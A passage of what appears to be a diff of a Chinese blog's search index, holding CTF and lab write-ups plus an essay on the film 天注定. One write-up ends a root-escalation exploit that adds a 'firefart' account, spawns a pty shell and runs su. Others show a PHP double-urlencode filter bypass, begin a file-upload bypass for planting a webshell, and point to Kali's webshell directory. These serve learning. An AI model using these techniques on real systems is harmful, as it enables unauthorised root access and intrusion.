&#39;firefart&#39; and the password &#39;a&#39;.</p><p>DON&#39;T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd</p></blockquote><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-0fe4d69f9be2559e.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>遇到一个异常：stardard in must be a<br>tty，说明需要一个终端（shell），那么尝试python反弹个bash shell</p><p>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</p><p>su firefart  /  a</p><p>得到root权限。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-c1bf3c3a35c79bca.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>kali目录下，有不少webshell可用： /usr/share/webshells/php </p><p>shell命令学习：</p><blockquote><p>cat base64_password | tr -d &#39;\n&#39; &gt; decoded_password       <br>（去除文件每一行的\n换行符）</p></blockquote><p>tr，translate的简写，主要用于压缩重复字符，删除文件中的控制字符以及进行字符转换操作。</p><p>-d：delete，删除SET1中指定的所有字符，不转换<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>training</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>training</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2017/11/23/%E5%A4%A9%E6%B3%A8%E5%AE%9A.html/"/>
+    <url>/2017/11/23/%E5%A4%A9%E6%B3%A8%E5%AE%9A.html/</url>
+    
+    <content type="html"><![CDATA[<hr><p>title: 天注定<br>注定</p><p>::: {.show-content}<br>《天注定》被禁了，甚至连被禁的原因都语焉不详。对此我颇不以为然，中国电影的审查就是这样大惊小怪无厘头。</p><p>可是当我时隔三年真正看了这部电影以后，我才觉得这样的电影简直不可能不被禁，能在网络上找到种子完整观看本片，已经是我国言论自由、文化管制宽松的一个巨大进步了。</p><p>本片将当年备受争议轰动全国的三桩刑案外加富士康跳楼事件一网打尽，以近乎白描的手法记叙了胡文海杀村官案、周克华跨省抢劫案、邓玉娇刺官案以及富士康十四连跳，这些案件和事件无不撕裂着社会舆论和大众神经，时至今日仍余波未平，它没有丝毫规避审查风险的主观意愿，反而是精准地踩上一颗又一颗的地雷。</p><p>如今再看贾樟柯关于这部电影送审戛纳的宣传，说这是”致敬张彻和胡金铨等武侠片前辈的现代侠义电影”，不禁让人觉得搞笑。</p><p>这甚至都不是高级黑，而是一种赤裸裸的反讽，因为这跟侠义完全无关，它只是记录了当代中国一个个脆弱的个体在面临不公走投无路</p><p>从而诉诸血腥暴力的无奈悲剧。解析这部电影以及电影的事件背景可以让我们对这个光怪陆离的时代多一些沉重的思考。</p><p>（转载，作者：李良君<br> 链接：<a href="https://www.zhihu.com/question/22889244/answer/120590363">https://www.zhihu.com/question/22889244/answer/120590363</a> 来源：知乎）</p><p>\</p><p>第一个故事：本该是国家矿产资源和土地，被官员变相卖出。胡文海不服，到处上访，但是没有人理他。这个行为触怒了官员，于是他被官员找人打了。于是胡文海拿枪杀了十几个人。</p><p>第二个故事：洗浴中心当前台的邓玉娇，被官员当成小姐，仗着有钱，非要强迫和她发生关系。邓玉娇愤怒地杀了该官员。</p><p>第三个故事：抢劫杀人犯周克华，怎么说呢，这个人不想过被琐碎现实磋磨的鸡毛蒜皮的生活，于是他选择走上违法犯罪的生活。</p><p>第四个故事：富士康的工人，小辉，和周克华不一样，他是个老老实实的年轻人，过着到处打工的生活。</p><p>                  <br> 他在富士康待不下去，去了东莞。。。。。。。。单纯的孩子可能不知道，东莞的色情服务可是很出名的。</p><p>他喜欢上了东莞里的一个小姐，但是爱情注定与现实妥协。于是他自杀了。</p><p>你隐忍也是罪，反抗也是罪，杀人也是罪，自杀也是罪。</p><p>看了这部片子有不短的时间了，我知道光鲜的城市下有着阴影，但我只是知道而已。</p><p>最近去打了份工，同事都是和我差不多大的同龄人。</p><p>但是没想到，离我那么近的地方，他们过着那样的生活。</p><p>八九点上班，晚上十点过后下班，经常加班到凌晨过后。没有加班费，没有双休日，没有三险一金。工资低，工作时间长。</p><p>一直都知道中国经济就是靠压榨劳动人民的廉价劳动力。但只是知道而已，没有想过这种生活如此之近，我很多次路过这家普普通通的店子，去一家大型超市买零食，一次花掉百多块也没有丝毫感觉。</p><p>直到我走进这家店，开始和他们朝夕相处，才体验到一种上班上班上班，日子没有丝毫希望的感觉，令人窒息。</p><p>\</p><p>我不认为，没有学历就一定要过这样一年到头呆在店里，从来没有生活的日子。</p><p>廉价劳动力的时代会过去的，但并不是忍让忍让就能自动变好。</p><p>在马克思的年代，无产阶级过的生活更加恶劣。马克思寓言资本主义必定灭亡，然而资本主义没有。</p><p>这并不是他错了，而是他改变了未来。</p><p>资本主义妥协了。前辈的鲜血才让劳动者的利益提高了这么一点，我们不应该忘记。</p><p>然而代表无产阶级的某D忘记了他曾经的誓言，不到百年，就变质了。</p><p>弱小者没有资格改变有权有势的人的想法，他们陶醉于中国飞速经济发展之下，忙于享受生活。</p><p>\</p><p>忧郁的眼中没有泪花，</p><p>你们坐在织机旁咬牙切齿：</p><p>德意志，我们织你的裹尸布，</p><p>我们织进三重的诅咒──</p><p>我们织，我们织！</p><p>一重诅咒将上帝咒骂，</p><p>我们在饥寒交迫时乞求过他；</p><p>希望和期待都是徒然，</p><p>总被他戏弄、挪揄、欺骗──</p><p>我们织，我们织！</p><p>一重诅咒给富人的国王，</p><p>他毫不关心我们的痛痒，</p><p>他刮去我们仅有的分币，</p><p>把我们当作狗一样枪毙──</p><p>我们织，我们织！</p><p>一重诅咒给虚伪的祖国，</p><p>这里到处是耻辱和堕落，</p><p>好花很早就被采摘一空，</p><p>霉烂的垃圾养饱了蛆虫──</p><p>我们织，我们织！</p><p>梭子象在飞，织机咯吱响，</p><p>我们不停地织，没日没夜──</p><p>老德意志啊，我们织你的裹尸布！</p><p>我们织进三重的诅咒，</p><p>我们织，我们织！<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2017/02/01/BC02-%E5%BE%AA%E7%8E%AF.html/"/>
+    <url>/2017/02/01/BC02-%E5%BE%AA%E7%8E%AF.html/</url>
+    
+    <content type="html"><![CDATA[<hr><dl><dt>title: BC02</dt><dd>BC02<br>post}<br>::: {.show-content}<br>**给出一个循环公式，对于一个整数n，当n为奇数时，n=3n+1，当n为偶数时，n=n/2，如此循环下去直到n=1时停止。<br>**</dd></dl><p>现要求对两个整数i = 900、j =<br>1000，输出i、j之间（包括i、j）的所有数进行上述循环时的最大循环次数（包括n和1）</p><p>**分析：<br>**</p><p><strong>知识点一</strong>：while<br>循环。它默认执行后面的语句，直到不符合条件（为False）就退出。</p><p>                     要注意条件的设置，不然会一直循环。</p><p><strong>知识点二</strong>：内建函数MAX（）的使用</p><p>一般用法：max(1,2,3)求元素最大值</p><p>列表求最大值：max([xdd])  xdd是一个列表，max取列表中的最大值</p><p>max（[xdd]，[wtf]），xdd和wtf是两个列表，取两个列表中的最大值</p><p><strong>知识点三：</strong>列表解析，是python参考某编程语言，可以很方便地建立列表，如12行。</p><p>用法是    **[对象的操作  for  对象  in  列表]**\</p><p>下面12行的用法</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-6d5d43393c84391f.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p><br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2017/02/01/BC05%E5%A4%A7%E6%95%B0%E6%B1%82%E5%92%8C.html/"/>
+    <url>/2017/02/01/BC05%E5%A4%A7%E6%95%B0%E6%B1%82%E5%92%8C.html/</url>
+    
+    <content type="html"><![CDATA[<hr><p>title: BC05大数求和<br>求和<br>show-content}<br><a href="http://www.shiyanbar.com/ctf/1883">题</a>：求sum =<br>1!+2!+3!+……+6788!+6789!的末5位。</p><p>分析：该题和<a href="http://www.jianshu.com/p/ae2d198aa1c1">上一题</a> ，换汤不换药。</p><p>取余，例如 123456 /  10 =  12345……<br>6（好久没做小学题了，复习下，省略号+6 是余数为6的意思） </p><p>          123456 / 100 = 1234 …… 56</p><p>          123456 / 1000 = 123 …… 456</p><p>所以求末5位，就是除以 100000 （不用数了，5个零！）的余数。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-20010edc72f4c2ad.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2017/02/01/BC06%E5%A5%96%E5%88%B8.html/"/>
+    <url>/2017/02/01/BC06%E5%A5%96%E5%88%B8.html/</url>
+    
+    <content type="html"><![CDATA[<hr><p>title: BC06奖券<br>奖券<br>::: {.show-content}<br><strong>题目</strong>：某抽奖活动的奖券号码是6位数（100000-999999），请计算其中不含”4”的号码的奖券数量。\</p><p><strong>思路：在字符串里搜索某个字符，很简单。但是题目中是数值，不是字符，所以用类型转换成字符。</strong></p><p>知识点一：</p><p>python   str( )函数，将任意值转换为字符串</p><p>知识点二：</p><p>find()函数 ，<strong>语法</strong>str.find(str, beg=0, end=len(string))</p><p><strong>参数</strong>：str -- 指定检索的字符串\</p><p>beg -- 开始索引，默认为0。</p><p>end -- 结束索引，默认为字符串的长度。</p><p><strong>返回值</strong>：如果包含子字符串，返回开始的索引值，否则返回-1。\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-b71b4f6c4176b3d5.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2017/02/01/BC07hashkill.html/"/>
+    <url>/2017/02/01/BC07hashkill.html/</url>
+    
+    <content type="html"><![CDATA[<hr><p>title: BC07hashki<br>hashki<br>::: {.show-content}<br><strong>6ac66ed89ef9654cf25eb88c21f4ecd0是flag的MD5码，（格式为ctf{XXX_XXXXXXXXXXX_XXXXX}）由一个0-1000的数字，下划线，纽约的一个区，下划线，一个10000-15000的数字构成。</strong></p><p>这是一个很典型的题目。用到了一些字符串的组合，和对比。\</p><p>分析：MD5加密，导入<strong>hashlib模块</strong>。有三个部分组合成flag。</p><p>知识点一：hashlib的使用</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-68442978ea62cd00.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>知识点二：将三个有范围的数分别组合。</p><p><strong>+<br>是序列的连接操作符，能将两个序列连接</strong>，变成一个新序列。str()的用法在上一章《奖券》已经学过。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-c5560beb31ebe773.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-d448621b38ad6b14.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2017/02/01/BC12%E9%80%9F%E5%BA%A6%E7%88%86%E7%A0%B4%EF%BC%88request%E6%A8%A1%E5%9D%97%EF%BC%89.html/"/>
+    <url>/2017/02/01/BC12%E9%80%9F%E5%BA%A6%E7%88%86%E7%A0%B4%EF%BC%88request%E6%A8%A1%E5%9D%97%EF%BC%89.html/</url>
+    
+    <content type="html"><![CDATA[<hr><p>title: BC12速度爆破（request模块）<br>块）<br>�钟提交答案。这里就需要写一个python脚本，用到web交互模块。</p><p>先看看题目中是用POST，还是GET提交答案。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-47a4aa6c23dbed79.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>用firebug，F12打开<br>:::<br>:::</p><p>多点几次会发现，每次获取到的sha1值都是不一样的,so……\</p><p><strong>知识点一</strong>：自动获取该链接，导入到本地<strong>生成HTML文件</strong>。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-98cd9b7c6712f2d1.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>照猫画虎写出代码<br>:::<br>:::</p><p>知识点二：在获取到的html文件中<strong>找到sha1值</strong>。</p><p><strong>正则表达式模块re</strong></p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-b6fabb242fecfc92.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>知识点三：获取到该sha1值，<strong>计算</strong>出符合该sha1值的整数</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-9c30233894944cec.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>知识点四：用urllib、urllib2模块<strong>提交</strong>答案</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-6b83d492f1add0bf.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>将代码结合到一起，但是老是说时间超时。。。\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-61bc7454468b98be.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>。。。还是看看答案吧。。。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-9f4f603a05b35f31.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>好简洁，，现在学习下request模块，它是http客户端库。</p><p><a href="http://cn.python-requests.org/zh_CN/latest/">官方文档</a> \</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-6f22f66e425f687a.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>pip安装该模块<br>:::<br>:::</p><p>第四行，session保存cookies，在这里<strong>自动提供</strong>服务端需要的数据π_π，好方便哇。。</p><p>第五行，获取url 的第580到620个字符，不用正则表达式搜索。</p><p>之后把数字取MD5值，再取sha1值，并进行对比。提交符合的值，然后打印出提交后的url内容。<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2017/02/01/BC13-ASCII%E8%89%BA%E6%9C%AF.html/"/>
+    <url>/2017/02/01/BC13-ASCII%E8%89%BA%E6%9C%AF.html/</url>
+    
+    <content type="html"><![CDATA[<hr><dl><dt>title: BC13</dt><dd>BC13<br>post}<br>::: {.show-content}<br><a href="http://ctf5.shiyanbar.com/ppc/acsii.php">题目</a>：两秒提交由xx拼接的数值。</dd></dl><p>分析：一开始我想岔了，以为要用到opencv等图形库来判断图形，类似验证码识别。</p><p>         <br> 方向错了，验证码识别是图形判断。但这个题目里，其实这还是文字么。。。然后看源码。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-bb2b180c1d88fb5d.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>html：超文本标记语言。$nbsp代表空格的意思，&lt;br /&gt;代表换行。</p><p>于是我们可以搜集到各个数字对应的源代码。</p><p>通过编程，将源代码输出为对应的数字，提交给题目即可。</p><p>知识点一：requests模块，post提交参数</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-9c75896946da5605.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><blockquote><p>url = &#39;<a href="http://ctf5.shiyanbar.com/ppc/acsii.php/&#39;">http://ctf5.shiyanbar.com/ppc/acsii.php\&#39;</a></p><p>s = requests.Session()</p><p>a=s.get(url)</p><p>post = {&#39;inputNumber&#39;:result}      <br>post是我们要提交的表单参数，result是我们计算出的结果。</p><p>r = s.post(url,data=post)             提交结果</p><p>print r.content   输出提交后网页内容</p></blockquote><p>知识点二：re.sub()可以将源码替换为相应的数字。<a href="https://github.com/Whale3070/chapter7/blob/master/ascii">python源码1</a></p><p>通过复制源代码，然后在本地建立html文件，用浏览器打开的方式，可以最终建立数字与源码的对应关系。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-bb9cc484b7882f20.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-a7e81e4cf82def0a.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>知识点三：re.findall(&#39;\d&lt;br/&gt;&#39;,&#39;文本&#39;)<br> 查找字符串是<strong>数字后接换行号</strong>的。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-b6e0e7df903a1adc.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>知识点四：join函数，将列表元素进行组合。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-0302ada530b54b83.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><blockquote><p>Str1 = &#39;&#39;.join(result1)     result1是一个序列</p><p>print Str1</p></blockquote><p>然后提交就得到了flag。哦，对了，<a href="https://github.com/Whale3070/chapter7/blob/master/ascii2">源码</a>。<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2017/02/01/BC15%E6%9C%89%E5%85%B3%E7%B4%A0%E6%95%B0%E4%B8%A4%E9%81%93%E9%A2%98.html/"/>
+    <url>/2017/02/01/BC15%E6%9C%89%E5%85%B3%E7%B4%A0%E6%95%B0%E4%B8%A4%E9%81%93%E9%A2%98.html/</url>
+    
+    <content type="html"><![CDATA[<hr><p>title: BC15有关素数两道题<br>道题<br>ent}<br><a href="http://www.shiyanbar.com/ctf/1922">http://www.shiyanbar.com/ctf/1922</a></p><p>设一个等差数列，首元素为367，公差为186,<br>现在要求找出属于该等差数列中的第151个素数并输出。</p><p>分析：素数即只能被1 和 它本身 整除的数。用代码表示，需要将n除以2、3<br>…… n-1，当余数为0时候，说明n为素数。</p><p>          首项是367，尾项不知道，间隔是186，可以联想到for循环 </p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-4163002a54e4dbf2.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p><a href="http://www.wechall.net/challenge/training/prime_factory/index.php">题目二：http://www.wechall.net/challenge/training/prime_factory/index.php</a></p><p>求大于一万的两个素数，且各位数相加也是素数。例如，２３　＝　ｐrime，２＋３　＝　５　＝　ｐｒime。</p><p><a href="https://github.com/Whale3070/chapter7/blob/master/prime">源码</a><br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2017/02/01/BC8%E4%B8%A4%E4%B8%AA%E6%9C%80%E5%A4%A7%E5%AD%90%E4%B8%B2%E5%92%8C.html/"/>
+    <url>/2017/02/01/BC8%E4%B8%A4%E4%B8%AA%E6%9C%80%E5%A4%A7%E5%AD%90%E4%B8%B2%E5%92%8C.html/</url>
+    
+    <content type="html"><![CDATA[<hr><p>title: BC8两个最大子串和<br>串和<br>tent}</p><blockquote><p>题目：对于一个包含负值的数字串array[1...n]，要找到它的两个子串</p><p>array1[0...s1]（0&lt;=s1&lt;=i&lt;n）和array2[i &lt;s2...&lt;= n-1]\</p><p>使得array1[0...s1]和array2[s2...n]两个子串的和最大。\</p></blockquote><p>\</p><p>分析：\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-0688156adc8727da.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>给定的数字串里有正数、也有负数。子串的和最大，所以不考虑负数部分。</p><p>看了下子串的取值范围，要最大的话，子串1<strong>从0到i</strong>，子串2，从大于i的第一个数<br>到 n-1。那么key值就是数字串的正数和减去最大值（都是整数，不考虑小数）。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-539c36b75329e3a0.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>结果，提交答案是错的。</p><p>看答案：这题主要是题意没表述好，导致不少人理解错，以为第一个串必须从array[0]开始、第二个串必须以arrry[n-1]结束、两串没有交集，这样得到的结果就是2693。\</p><p>其实理解为0&lt;=s1&lt;s2&lt;n。</p><p>我认输，这样的题目还有什么好说的。。\</p><p><br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2017/02/01/BCB06%E5%88%86%E6%95%B0%E6%8B%86%E5%88%86.html/"/>
+    <url>/2017/02/01/BCB06%E5%88%86%E6%95%B0%E6%8B%86%E5%88%86.html/</url>
+    
+    <content type="html"><![CDATA[<hr><p>title: BCB06分数拆分<br>拆分<br>how-content}<br>存在这样的一个等式，1/400=1/x+1/2y，(x&gt;y)。你的任务就是求出共有多少对这样的正整数x和y，使得该等式成立。（提示：你只需要求出有多少对，而不必输出这些X,Y对具体是多少）</p><p>知识点一：模块fractions。分数模块的用法：先导入该模块&quot;from fractions<br>import Fraction&quot;</p><p>Fraction(浮点数) = Fraction(分子，分母）</p><p>Fraction(分子，分母）= 化简后的，，Fraction(分子，分母）</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-e914788b3a815de9.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2017/02/01/D-1-php%E5%A4%A7%E6%B3%95(%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%89.html/"/>
+    <url>/2017/02/01/D-1-php%E5%A4%A7%E6%B3%95(%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%89.html/</url>
+    
+    <content type="html"><![CDATA[<hr><p>title: D<br>tle: D<br> {.post}<br>::: {.show-content}<br>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-c3eddc17dad043ee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>\</p><p>要用到的<strong>知识点一</strong>，eregi()，字符串对比解析，与大小写无关。</p><p>这个函数对比括号里的”hackerDJ”，与获取到的id值，如果一致，就输出”不被允许”</p><p><strong>知识点二</strong>，urlencode(),urldecode(),这是转换的函数。</p><p>加密是把中文字符转换为十六进制，然后在每个字符前面加一个标识符%。在上图中是将获取的id值解码，解码后要等于hackerDJ，就能得到flag.</p><p>为了达到这个目的，我们必须将hackerDJ编码,由于网上的编码是基于js的，只能编码一部分，字母是不能转换的，于是我们自己整。</p><p>h的十六进制为68，”%68”就是加密后的h。</p><p><strong>知识点三</strong>，浏览器会自动将输入到地址栏的非数字字母转换为url编码。</p><p>由于浏览器处理的时候会自动将”%68”解码一次，就是变成了hackerDJ，这样我们会得到”不被允许”</p><p>所以我们再编码一次。这次可以用网上的urlencode自动编码。”%68”编码变成”%2568&quot;</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-1be8a2444832e401.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-81c51d89da528ab8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2017/02/01/J-1%E4%BD%A0%E8%83%BD%E8%B7%A8%E8%BF%87%E5%8E%BB%E5%90%97%EF%BC%88%E8%A7%A3%E7%A0%81%EF%BC%89.html/"/>
+    <url>/2017/02/01/J-1%E4%BD%A0%E8%83%BD%E8%B7%A8%E8%BF%87%E5%8E%BB%E5%90%97%EF%BC%88%E8%A7%A3%E7%A0%81%EF%BC%89.html/</url>
+    
+    <content type="html"><![CDATA[<hr><p>title: J<br>tle: J<br> {.post}<br>::: {.show-content}<br>知识点：base64编码</p><p>Base64编码可用于在<strong>HTTP环境下传递较长的标识信息</strong>。例如，在Java<br>Persistence系统Hibernate中，就采用了Base64来将一个较长的唯一<a href="http://baike.baidu.com/view/390932.htm">标识符</a>（一般为128-bit的UUID）编码为一个字符串，用作HTTP表单和HTTP<br>GET<br>URL中的参数。在其他应用程序中，也常常需要把二进制数据编码为适合放在URL（包括隐藏表单域）中的形式。此时，采用Base64编码不仅比较简短，同时也具有不可读性，即所编码的数据不会被人用肉眼所直接看到。\</p><p>\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-112d3972bcb7b74c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-d5570d2b48d1a17d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-2af3189acd863004.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-a57b82b8ca76f421.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>用notepad++或者其他的文本编辑器打开就知道了flag<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2017/02/01/M-3Forbidden.html/"/>
+    <url>/2017/02/01/M-3Forbidden.html/</url>
+    
+    <content type="html"><![CDATA[<hr><p>title: M<br>tle: M<br> {.post}<br>::: {.show-content}<br>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-b1f142984eac1eec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>参照语言代码与国家地区对照表。</p><p>\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-bb3c50432dcf4cf4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2017/02/01/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%EF%BC%88burp%EF%BC%89.html/"/>
+    <url>/2017/02/01/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%EF%BC%88burp%EF%BC%89.html/</url>
+    
+    <content type="html"><![CDATA[<hr><p>title: 上传绕过（burp）<br>urp）<br>ontent}<br>先传txt，提示需要jpg；</p><p>再传jpg,，提示需要php（见下图）</p><p>再传php，提示需要jpg。</p><p>em.......….到底需要上传jpg还是php呢？</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-c7f83f373903c8e4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-e13a60c24516aa20.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><blockquote><p>分析：首先，知道题目只允许jpg,gif,png，如果是其他名称就会显示”不被允许的文件类型.....................”。</p><p>         <br> 如果要用上传漏洞获取webshell，那么应该让服务器把我们的文件当作php脚本执行。</p><p>         <br> 